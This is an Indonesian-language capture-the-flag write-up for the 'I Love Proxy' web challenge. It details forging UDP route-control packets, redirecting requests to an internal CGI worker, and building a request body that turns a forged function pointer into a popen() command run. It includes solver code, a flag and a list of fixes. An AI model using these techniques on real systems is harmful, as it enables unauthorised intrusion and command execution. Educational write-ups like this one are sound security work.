# I Love Proxy

## Informasi Challenge

- CTF: No Hack No CTF 2026
- Kategori: Web
- Judul: I Love Proxy
- Deskripsi: `Proxy Proxy Proxy another proxy chall but it seems different`
- Difficulty: Hard

## Ringkasan

Port instance dipakai untuk dua protokol sekaligus: HTTP melalui TCP dan control plane melalui UDP. Control plane UDP menerima update route dengan token yang sepenuhnya bisa dihitung dari challenge value milik client. Route baru kemudian diarahkan ke service internal `courier:7000`.

Request HTTP menuju route tersebut tidak langsung memberikan flag. `courier.cgi` memiliki rangkaian validasi header, Host, dan body yang membentuk simulasi heap exploit. Body yang tepat membuat indirect call diarahkan ke fungsi `run_filter` pada `0x4022ac`. Fungsi itu membungkus `popen()`, sehingga command `cat /flag.txt` dapat dijalankan.

## Arsitektur Service

`docker-compose.yml` menunjukkan tiga bagian penting:

```yaml
services:
  edge:
    ports:
      - "${PORT0}:8080"
      - "${PORT0}:5555/udp"

  courier:
    environment:
      PORT: "7000"
    expose: ["7000"]
```

Port publik yang sama dipetakan ke:

- TCP `8080` milik `edge-httpd`;
- UDP `5555` milik control plane;
- `courier:7000` hanya dapat diakses dari network internal Docker.

Flag disalin ke `/flag.txt` saat container courier dijalankan:

```dockerfile
CMD ["sh", "-c", "if [ -f /run/.proxy-seed ] && [ -r /run/.proxy-seed ]; then cp /run/.proxy-seed /flag.txt; else printf '%s' \"$FLAG\" > /flag.txt; fi && chmod 400 /flag.txt && unset FLAG && exec cgid"]
```

Jadi target akhirnya adalah membuat `courier.cgi` membaca `/flag.txt`.

## Recon Binary

File utama:

```text
proxy/edge-httpd
worker/cgid
worker/courier.cgi
```

Pemeriksaan awal:

```bash
file proxy/edge-httpd worker/cgid worker/courier.cgi
strings -a proxy/edge-httpd
strings -a worker/cgid
strings -a worker/courier.cgi
```

`edge-httpd` stripped, sedangkan binary worker menggunakan loader/packer kecil. Runtime image worker didump menjadi:

```text
worker/cgid.unpacked
worker/courier.unpacked
```

Binary hasil unpack tidak stripped dan memiliki simbol yang cukup jelas, antara lain:

```text
analyze_headers
host_body_chain_ok
heap_layout_slot
heap_layout_slide
marker_cookie
tape_stream
run_filter
```

String dari `edge-httpd` memperlihatkan banyak endpoint umpan seperti `/admin/flag`, `/internal/flag`, `/debug/routes`, dan `/proc/self/maps`. Endpoint tersebut bukan jalur flag.

## Bug 1: Forgery Control Plane UDP

`edge-httpd` membuka UDP listener untuk mengubah routing table. Protokolnya memakai magic:

```python
MAGIC = 0x89543217
```

### Hello packet

Format packet pertama:

```text
MAGIC          4 byte, big endian
version        0x03
opcode         0x36
challenge      4 byte
checksum       4 byte
```

Challenge dipilih sendiri oleh client:

```python
challenge = secrets.randbits(32)
```

Checksum hanya memakai data packet dan seed yang juga diketahui client.

### Lease token

Update route membutuhkan lease token, tetapi token tersebut bukan MAC dan tidak menggunakan secret server. Nilainya hanya transformasi dari challenge:

```python
def lease_token(challenge):
    raw = int.from_bytes(struct.pack(">I", challenge), "little")
    left = ((challenge ^ 0x7F4A7C15) * 0x045D9F3B + 0x27100001) & 0xffffffff
    left = rol32(left, ((raw >> 24) & 7) + 5)

    right = (challenge - 0x5A3CE1D3) & 0xffffffff
    right = ror32(right, ((raw >> 16) & 7) + 3)

    return 0x31415927 if left == right else left ^ right
```

Karena challenge dan seluruh konstanta diketahui, token valid dapat dibuat tanpa mengetahui data server.

### Route update packet

Format update:

```text
MAGIC             4 byte
version           0x03
opcode            0x71
subtype           0x22
selector          1 byte
path length       2 byte
upstream length   2 byte
lease token       4 byte
encrypted path
 encrypted upstream
checksum          4 byte
```

Path dan upstream hanya di-XOR dengan stream sederhana:

```python
def route_crypt(data, key):
    seq = 0x31
    out = bytearray()
    for byte in data:
        out.append(byte ^ seq ^ key)
        seq = (seq + 0x0D) & 0xff
    return bytes(out)
```

Route yang dipasang solver:

```text
/7tqqrnlm5  ->  courier:7000
```

Packet UDP tidak memiliki acknowledgement. Solver mengirim hello dan update tiga kali agar lebih stabil pada remote instance.

## Forwarding ke CGI Worker

Setelah route berhasil dipasang, request HTTP ke `/7tqqrnlm5` diteruskan ke `courier:7000`.

Service `cgid` melakukan parsing request, lalu mengubahnya menjadi environment CGI:

```text
REQUEST_METHOD
REQUEST_URI
PATH_INFO
QUERY_STRING
CONTENT_LENGTH
COURIER_HEAD
HTTP_HOST
HTTP_<HEADER_LAIN>
```

Body dikirim ke stdin dan `courier.cgi` dieksekusi:

```c
execl("/usr/local/libexec/courier.cgi", "courier.cgi", NULL);
```

Header mentah tetap tersedia melalui `COURIER_HEAD`, sehingga `courier.cgi` bisa menghitung state berdasarkan request asli.

## Hidden Path

Akses langsung ke path flag ditolak:

```text
/flag
/flag.txt
/admin/flag
```

Responsnya:

```text
flag export requires render worker approval
```

Jalur tersembunyi diperiksa menggunakan FNV-1a terhadap suffix path. Salah satu kondisinya:

```text
suffix length = 10
FNV1a32(suffix) = 0x26045b27
```

Path solver memenuhi kondisi tersebut:

```text
FNV1a32("/7tqqrnlm5") = 0x26045b27
```

Karena itu route dan request sama-sama memakai:

```text
/7tqqrnlm5
```

## Header Collision

`courier.cgi` memanggil `analyze_headers()` pada `COURIER_HEAD`.

Nama header dinormalisasi dengan aturan:

- lowercase;
- underscore diubah menjadi dash;
- maksimal 95 byte;
- hash menggunakan DJB2;
- bucket adalah `hash & 31`.

Solver menggunakan 30 header bernama `l`:

```http
l: x
l: x
...
l: x
```

Nilai hash-nya:

```text
DJB2("l") = 0x0002b611
0x0002b611 & 31 = 17
```

Tiga puluh header identik menghasilkan 29 duplicate entries pada bucket 17. Ini memenuhi syarat:

```text
max_duplicate > 28
max_bucket == 17
```

Header khusus berikut mengaktifkan flag kedua tanpa mengaktifkan flag pertama:

```http
-tveemh: raw
```

Nilai yang dicari binary:

```text
DJB2("-tveemh") = 0xa2e31e1b
value_gate("raw") = 0x5c547beb
```

State akhir yang diperlukan:

```text
flag_a    = 0
flag_b    = 1
collision = 1
bucket    = 17
pressure  = 29
```

## Fold dan Layout Seed

Seluruh raw HTTP head di-hash menggunakan FNV-1a 32-bit:

```python
fold = fnv1a32(head)
```

Layout seed kemudian dihitung dari bucket dan pressure:

```python
layout_seed = mix64(
    (bucket << 44)
    ^ (pressure << 19)
    ^ 0x484570243E202F2C
)
```

Nilai `fold`, `layout_seed`, body length, cookie, slide, dan lane saling terkait. Mengubah satu karakter header akan mengubah hampir seluruh isi body exploit.

## Host Gate

`host_body_chain_ok()` meminta Host yang sangat panjang. Format yang dipakai:

```python
host_nonce = (
    (BODY_LEN << 7)
    ^ layout_seed
    ^ 0x5353495F504F5354
) & 0xffffffffffff

host = "A" * 1368 + f"{host_nonce:012x}" + ":"
```

Dengan body length:

```python
BODY_LEN = 0x200
```

Hasil header:

```http
Host: AAAAA...AAAA<12-digit-hex>:
```

Binary memeriksa:

- body lebih besar dari 239 byte;
- posisi colon melewati offset 1379;
- 1368 byte pertama bernilai `A`;
- nonce 48-bit cocok dengan body length dan layout seed.

Ini bukan sekadar header overflow biasa. Panjang Host menjadi bagian dari gate yang menghubungkan state header dengan state body.

## Heap Layout

`courier.cgi` membuat heap scene, kemudian body disalin ke offset yang berubah berdasarkan request:

```python
slot = heap_layout_slot(bucket, pressure, fold, BODY_LEN)
slide = heap_layout_slide(
    bucket,
    pressure,
    fold,
    BODY_LEN,
    layout_seed,
    cookie,
)

lane = mixed_lane & 7
copy_offset = slide + lane
```

Agar field mendarat pada absolute offset yang diperiksa binary, solver memakai helper:

```python
def put_abs(offset, data):
    index = offset - copy_offset
    body[index:index + len(data)] = data
```

Jadi seluruh body dibangun setelah `fold`, `slide`, dan `lane` diketahui.

## Passing `host_body_chain_ok()`

Beberapa field awal membentuk chain yang diperiksa dua kali, oleh `cgid` dan `courier.cgi`:

```python
key = jmp_key(pressure, fold, layout_seed)

put_body(0x49, p64(0x58))
put_body(0x58, p64(0x58))
put_body(0x80, p64(key ^ 0x9C8E949AA062989E))
put_body(0x88, p64(key ^ 0x01A00000))
put_body(0x90, p64(key ^ rol64(chain32, 17)))
put_body(0xD0, p64(0xF8))
put_body(0xD8, p64(0x5245545F414C4947))
put_body(0xE0, p64(0x53595354454D5F31))
```

Dua nilai terakhir jika dibaca little endian menjadi marker internal:

```text
GILATER_
1_METSYS
```

Nilai tersebut dipakai sebagai alignment dan system marker, bukan string yang dikirim ke shell.

## Stage 2 dan Cache Gate

Setelah chain awal lolos, binary memeriksa gate kedua pada absolute offset:

```text
0x107  stage gate, 8 byte
0x10f  check32, 4 byte
0x113  check16, 2 byte
0x115  marker, 17 byte
0x126  cache gate, 8 byte
0x146  marker cookie, 8 byte
```

Seluruh nilai dihitung dari:

```text
fold
bucket
pressure
slot
slide
layout_seed
cookie
body length
```

Contoh stage gate:

```python
gate = mix64(
    ((fold << 32) ^ (pressure << 23) ^ (slot << 57))
    ^ (BODY_LEN * 0x94D049BB133111EB)
    ^ (slide << 48)
    ^ (layout_seed ^ cookie)
    ^ 0x7072656C75646531
)

put_abs(0x107, p64(gate ^ 0x0000535441474532))
```

Konstanta terakhir mengandung marker `STAGE2`.

## Menyisipkan Command

Command yang akan dijalankan:

```text
cat /flag.txt
```

Command tidak disimpan secara plaintext. Setiap byte di-XOR dengan index dan stream hasil `tape_stream()`:

```python
for i, byte in enumerate(b"cat /flag.txt"):
    stream = tape_stream(
        bucket,
        pressure,
        fold,
        layout_seed,
        i,
        length,
        cookie,
    )
    encrypted.append(
        byte
        ^ ((23 * i - 89) & 0xff)
        ^ (stream & 0xff)
    )
```

Field terkait command:

```text
0x13e  command length
0x142  encrypted command checksum
0x156  encrypted command bytes
```

Checksum harus dihitung atas encrypted bytes dengan state machine yang sama seperti binary.

## Forged Indirect Call

Setelah command berhasil didekripsi, binary mengambil function pointer terenkode dari offset `0x14e`.

Target yang dipilih:

```python
RUN_FILTER = 0x4022AC
```

Simbol pada binary hasil unpack:

```text
00000000004022ac t run_filter
```

Pointer yang disimpan tidak dapat ditulis langsung. Solver membalik seluruh decoding expression:

```python
shift = ((checksum ^ length ^ fold ^ (layout_seed & 0xffffffff)) & 31) + 13
before_rotate = rol64(RUN_FILTER ^ ptr_mix, shift)
stored_ptr = ror64(ptr_mix, 17) ^ (
    before_rotate - 0xE9A9984E61C88607
)

put_abs(0x14E, p64(stored_ptr))
```

Saat diproses oleh `courier.cgi`, nilai tersebut kembali menjadi `0x4022ac` dan dipanggil dengan decrypted command sebagai argumen.

## `run_filter()` adalah Wrapper `popen()`

`run_filter()` mendekripsi tiga nama symbol saat runtime:

```text
popen
pclose
r
```

Kemudian symbol di-resolve menggunakan `dlsym()` dan dijalankan seperti:

```c
FILE *fp = popen(command, "r");
fread(buffer, 1, 8191, fp);
pclose(fp);
return strndup(buffer, count);
```

Dengan function pointer diarahkan ke `run_filter` dan argumen berisi:

```text
cat /flag.txt
```

hasil command dikembalikan sebagai body HTTP.

## Exploit Chain

```text
External TCP/UDP port
        |
        | UDP forged lease
        v
Inject dynamic route /7tqqrnlm5 -> courier:7000
        |
        | Crafted HTTP request
        v
edge-httpd forwards raw request
        |
        v
cgid converts headers/body into CGI environment
        |
        v
courier.cgi hidden suffix-hash endpoint
        |
        v
Header collision: bucket 17, pressure 29
        |
        v
Oversized Host passes 48-bit layout gate
        |
        v
Craft body according to fold/slide/lane/cookie
        |
        v
Decrypt command: cat /flag.txt
        |
        v
Decode forged pointer -> run_filter @ 0x4022ac
        |
        v
popen("cat /flag.txt", "r")
        |
        v
Flag returned in HTTP response
```

## Solver

Solver menerima URL sebagai satu-satunya argumen wajib:

```bash
python3 solve.py http://HOST:PORT
```

Contoh local:

```bash
python3 solve.py http://127.0.0.1:18080
```

Contoh remote:

```bash
python3 solve.py http://nhnc2.whale-tw.com:PORT
```

Alur solver:

1. Parse host dan port dari URL.
2. Hitung raw HTTP request dan seluruh body layout.
3. Kirim hello dan route update melalui UDP ke port yang sama.
4. Kirim crafted HTTP request melalui TCP.
5. Ulangi maksimal tiga kali jika UDP update belum terpasang.
6. Cari pola `NHNC{...}` dari response.

Format output:

```text
[*] Target: http://host:port
[*] Injecting route /7tqqrnlm5 -> courier:7000
[*] header fold=... bucket=17 pressure=29 slide=... lane=... slot=...
<FLAG>NHNC{...}</FLAG>
```

## Flag

```text
NHNC{I_L0ve_Pr0xy_Pr0xy_pr0xy_It_is_s0_wounderful_79eb0812399444cc9361d26dd7a9eafa}
```

## Perbaikan

Beberapa akar masalah yang perlu diperbaiki:

1. Jangan mengekspos control plane pada port publik.
2. Lease token harus menggunakan MAC dengan secret server, misalnya HMAC-SHA256.
3. Jangan menerima arbitrary upstream dari packet control plane.
4. Pisahkan parser HTTP edge dan worker dengan format request yang jelas, bukan raw forwarding.
5. Batasi jumlah dan panjang header sebelum diteruskan.
6. Hapus indirect function pointer yang dapat dibentuk dari data request.
7. Jangan memanggil `popen()` menggunakan data yang berasal dari client.
8. Jalankan worker dengan seccomp, user non-root, dan filesystem tanpa akses ke flag kecuali melalui endpoint yang sempit.
